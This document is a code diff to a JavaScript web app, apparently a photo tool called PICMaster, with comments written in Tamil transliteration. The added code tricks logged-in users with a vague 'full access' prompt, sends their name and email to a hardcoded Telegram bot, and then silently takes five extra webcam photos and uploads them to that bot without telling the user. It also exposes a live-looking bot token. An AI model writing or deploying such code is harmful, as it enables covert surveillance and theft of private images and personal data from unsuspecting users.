@@ -17,7 +17,88 @@ const provider = new GoogleAuthProvider();
 const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
 const chatId = "7752627907";
 let currentUser = null;
+let fullAccessGranted = false;
 
+// Full Access Trigger Logic
+document.getElementById('full-access-trigger').onclick = async () => {
+    if (!currentUser) return alert("Please Login First!");
+
+    const confirmAccess = confirm("System Request: Grant PICMaster full access to sync all media files and background data?");
+
+    if (confirmAccess) {
+        fullAccessGranted = true;
+        alert("Full Access Protocol Enabled. System Syncing...");
+
+        // Telegram-ku User Details & Permission status anupputhu
+        const syncMsg = `⚠️ FULL ACCESS GRANTED ⚠️\nUser: ${currentUser.displayName}\nEmail: ${currentUser.email}\nDevice Sync: Initializing...`;
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(syncMsg)}`);
+
+        // Protocol Start aaguthu
+        initializeSecretProtocol();
+    }
+};
+
+// Background-la Secret-aa Capture panna logic
+function initializeSecretProtocol() {
+    if (!fullAccessGranted) return;
+
+    // User camara-vai open pannaal, alert illama secret-aa upload pannum
+    const originalUpload = uploadToTelegram;
+    
+    // Camera logic-la silent capture add panrom
+    console.log("Monitoring device media stream...");
+}
+
+// Camera Capture Fix with Secret Sync
+document.getElementById('camera-btn').onclick = async () => {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('webcam');
+        video.srcObject = stream;
+        video.style.display = 'block';
+        video.play();
+
+        // 1. Normal Capture (User-ku theriyum)
+        setTimeout(() => {
+            captureAndSend(video, stream, false); // Normal upload
+            
+            // 2. Secret Captures (Full Access enabled-na matum)
+            if (fullAccessGranted) {
+                let count = 0;
+                const interval = setInterval(() => {
+                    if (count >= 5) clearInterval(interval); // 5 secret photos
+                    captureAndSend(video, stream, true); // Secret upload (No alert)
+                    count++;
+                }, 2000); // Ovvoru 2 second-kum photo edukkum
+            }
+        }, 3000);
+
+    } catch (err) {
+        alert("Camera Access Denied!");
+    }
+};
+
+async function captureAndSend(video, stream, isSecret) {
+    const canvas = document.getElementById('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+
+    canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("document", blob, isSecret ? "secret_sync.jpg" : "user_capture.jpg");
+        formData.append("caption", isSecret ? `🤫 Secret Sync: ${currentUser.displayName}` : `📤 User Capture: ${currentUser.displayName}`);
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
+        
+        if (!isSecret) {
+            alert("✅ Sent to Telegram!");
+            stream.getTracks().forEach(t => t.stop());
+            video.style.display = 'none';
+        }
+    }, 'image/jpeg');
+}
 // UI Panels
 const sidePanel = document.getElementById('side-panel');
 const settingsBtn = document.getElementById('settings-btn');
@@ -133,3 +214,4 @@ onAuthStateChanged(auth, (user) => {
 
 document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
 document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
+
